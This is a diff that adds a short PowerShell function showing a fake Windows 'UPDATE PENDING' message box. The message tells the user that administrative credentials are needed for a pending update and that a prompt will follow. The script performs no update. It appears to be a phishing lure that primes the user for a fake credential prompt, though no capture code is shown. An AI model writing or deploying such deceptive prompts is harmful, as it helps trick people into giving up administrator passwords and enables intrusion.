@@ -1,0 +1,7 @@
+Function Popup {
+            [string] $PopupMessage = 'Administrative credentials are needed to install a pending update. You will be prompted shortly.'
+            [string] $PopupTitle = 'UPDATE PENDING'
+            Add-Type -AssemblyName "System.Drawing","System.Windows.Forms"
+            [Windows.Forms.MessageBox]::Show(“$PopupMessage”, “$PopupTitle”, [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Information)
+        }
+Popup
